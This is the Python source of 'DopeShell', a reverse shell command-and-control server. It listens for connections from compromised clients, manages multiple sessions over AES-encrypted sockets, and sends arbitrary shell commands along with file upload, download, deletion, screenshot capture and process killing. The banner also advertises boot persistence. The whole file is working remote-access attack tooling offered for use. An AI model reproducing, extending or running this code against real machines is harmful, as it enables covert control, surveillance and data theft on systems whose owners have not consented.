# dopeshell/server.py
# TODO:
# differentiate between folders and files in LS command
import socket
import threading
import base64
import os
import struct
import platform
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import sys

BANNER = r"""
______                      _____  _            _  _ 
|  _  \                    /  ___|| |          | || |
| | | |  ___   _ __    ___ \ `--. | |__    ___ | || |
| | | | / _ \ | '_ \  / _ \ `--. \| '_ \  / _ \| || |
| |/ / | (_) || |_) ||  __//\__/ /| | | ||  __/| || |
|___/   \___/ | .__/  \___|\____/ |_| |_| \___||_||_|
              | |                                    
              |_|                                    
                                       
   DopeShell Server
   ----------------------
   Author: Abhishek, Manaswi
   Tool: Remote Shell Management
   Description: A versatile tool for remote shell access and management.
   Version: 2.0
   ----------------------
   Important Commands:
   - persist  : Setup persistence to ensure re-connect on boot.
   - help     : Show this help message with all available commands.
   - exit     : Terminate the session.
   - switch   : Switch between active sessions.
   ----------------------

   Server Started - Listening on: {host}:{port}
   """

class DopeShellServer:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.sessions = {}
        self.session_counter = 1
        self.active_session = None
        self.commands = {
            'help': 'List all commands and their usage.',
            'exit': 'Terminate the session.',
            'switch <session_id>': 'Switch to another active session.',
            'sessions': 'List all active sessions.',
            'upload <local_path> <remote_path>': 'Upload a file from the local machine to the remote machine.',
            'download <remote_path> <local_path>': 'Download a file from the remote machine to the local machine.',
            'pwd': 'Print the current working directory on the remote machine.',
            'cd <directory>': 'Change the current working directory on the remote machine.',
            'ls [directory]': 'List files in the specified or current directory on the remote machine.',
            'ps': 'List running processes on the remote machine.',
            'netstat': 'Show network connections on the remote machine.',
            'ifconfig/ipconfig': 'Show network configuration (depending on OS).',
            'cat <file_path>': 'Display the contents of a file on the remote machine.',
            'info': 'Display system information of the remote machine.',
            'mkdir <directory>': 'Create a new directory on the remote machine.',
            'delete <file_path>': 'Delete a file on the remote machine.',
            'kill <pid>': 'Kill a process on the remote machine by PID.',
            'clear': 'Clear the screen in the shell.',
            'find <filename>': 'Find a file by name on the remote machine.',
            'sysinfo': 'Display detailed system information.',
            'screenshot':'capture screenshot of remote machine screen.',
        }

    def receive_data(self, client_socket):
        # Read the data length first
        data_length = struct.unpack('>I', client_socket.recv(4))[0]
        data = b""
        while len(data) < data_length:
            chunk = client_socket.recv(4096)
            data += chunk
        return self.decrypt(data)

    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(encrypted_data)

    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        return decrypted_data



    def handle_client(self, session_id, client_socket):
        while True:
            if session_id != self.active_session:
                continue
            command = input(f"Session {session_id} Shell> ")
            
            if command.lower() == 'exit':
                # print('calling exit function!')
                client_socket.send(self.encrypt(command.encode('utf-8')))
                response = self.receive_data(client_socket)
                print(response.decode('utf-8'))
                del self.sessions[session_id]  # Remove session on exit
                while True:
                    self.list_sessions()
                    new_session_id = int(input("Enter session number or -1 to exit: "))
                    if new_session_id in self.sessions:
                        self.active_session = int(new_session_id)
                        print(f"[+] Switched to session {new_session_id}")
                        break
                    elif new_session_id == -1:
                        os._exit(0)
                    else:
                        print(f"[-] Session {new_session_id} does not exist.")

            elif command.lower().startswith('help'):
                parts = command.split(maxsplit=1)
                if len(parts) > 1:
                    specific_command = parts[1].lower()
                    description = self.commands.get(specific_command, "Command not found.")
                    help_text = f"{specific_command}: {description}"
                else:
                    help_text = "DopeShell Tool Help\n" \
                                "====================\n" \
                                "List of available commands:\n"
                    for cmd, desc in self.commands.items():
                        help_text += f"  {cmd:<30} - {desc}\n"
                    help_text += "\nFor detailed information on a specific command, type 'help <command>'"
                
                print(help_text)
                client_socket.send(self.encrypt(help_text.encode('utf-8')))
                continue

            elif command.lower().startswith('download'):
                _, remote_path = command.split()
                client_socket.send(self.encrypt(command.encode('utf-8')))
                with open(os.path.basename(remote_path), 'wb') as f:
                    while True:
                        # file_data = self.decrypt(client_socket.recv(4096))
                        file_data = self.receive_data(client_socket)
                        if file_data == b'EOF':
                            break
                        f.write(file_data)
                print(f"[+] Downloaded {remote_path} from the client.")

            elif command.lower() == 'screenshot':
                client_socket.send(self.encrypt(b"screenshot"))

                # Save the screenshot data to a file
                with open('screenshot.png', 'wb') as f:
                    while True:
                        file_data = self.receive_data(client_socket)
                        if file_data == b'EOF':
                            break
                        f.write(file_data)

                print(f"[+] Downloaded Screenshot from the client as screenshot.png")

            elif command.lower().startswith('upload'):
                _, local_path = command.split()
                client_socket.send(self.encrypt(f"upload {os.path.basename(local_path)}".encode('utf-8')))
                with open(local_path, 'rb') as f:
                    while chunk := f.read(4096):
                        client_socket.send(self.encrypt(chunk))
                client_socket.send(self.encrypt(b'EOF'))
                response = client_socket.recv(4096)
                print(self.decrypt(response).decode('utf-8'))


            elif command.lower() == 'sessions':
                self.list_sessions()

            elif command.lower().startswith("switch"):
                _, new_session_id = command.split()
                if int(new_session_id) in self.sessions:
                    self.active_session = int(new_session_id)
                    print(f"[+] Switched to session {new_session_id}")
                else:
                    print(f"[-] Session {new_session_id} does not exist.")
                continue
            else:
                client_socket.send(self.encrypt(command.encode('utf-8')))
                # response = client_socket.recv(4096)
                # print(self.decrypt(response).decode('utf-8'))
                response = self.receive_data(client_socket)
                print(response.decode('utf-8'))

        client_socket.close()
        # del self.sessions[session_id]  # Remove session on exit
        if not self.sessions:
            self.active_session = None  # Reset active session if no sessions remain


    def run(self):
        print(BANNER.format(host=self.host, port=self.port))
        # print(f"[*] Listening on {self.host}:{self.port}")
        while True:
            client_socket, addr = self.sock.accept()
            session_id = self.session_counter
            print(f"[*] Connection from {addr}, Session ID: {session_id}")
            self.sessions[session_id] = client_socket
            client_handler = threading.Thread(target=self.handle_client, args=(session_id, client_socket,))
            client_handler.daemon = True
            client_handler.start()
            self.session_counter += 1

            if not self.active_session:
                self.active_session = session_id
                print(f"[+] Automatically switched to session {session_id}")

    def list_sessions(self):
        print("Active Sessions:")
        for session_id in self.sessions:
            status = "Active" if session_id == self.active_session else "Idle"
            print(f"Session {session_id}: {status}")

def main():
    parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Server")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind the server to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Port to bind the server to (default: 4444)")
    parser.add_argument("--key", type=str, default="myverystrongpasswordo32bitlength", help="Encryption key (32 bytes)")

    args = parser.parse_args()

    key = args.key.encode("utf-8")
    server = DopeShellServer(args.host, args.port, key)
    server.run()

if __name__ == "__main__":
    main()